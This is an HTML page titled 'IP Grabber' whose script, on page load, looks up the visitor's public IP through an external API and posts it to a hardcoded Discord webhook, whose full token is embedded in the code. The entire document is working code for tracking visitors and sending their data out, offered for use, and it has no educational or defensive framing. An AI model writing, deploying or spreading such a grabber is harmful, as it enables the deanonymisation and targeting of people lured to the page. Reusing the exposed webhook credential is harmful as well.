<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Grabber</title>
</head>
<body>
    <h1>IP Grabber</h1>
    <p>Your IP will be sent to the webhook.</p>

    <script>
        // Webhook URL
        const webhookUrl = 'https://discord.com/api/webhooks/1266941813323862056/5TSHyNJCt59qejF7w3DxAADmGMfeR8SeABPTXaQ-CyRyq-wAYJhFioGzYzJ09if2hytB';

        // Function to send IP to webhook
        function sendIPToWebhook(ip) {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', webhookUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                content: `User IP: ${ip}`
            }));
        }

        // Fetch IP address using an external API
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                console.log('IP Address:', ip);
                sendIPToWebhook(ip);
            })
            .catch(error => console.error('Error fetching IP address:', error));
    </script>
</body>
</html>
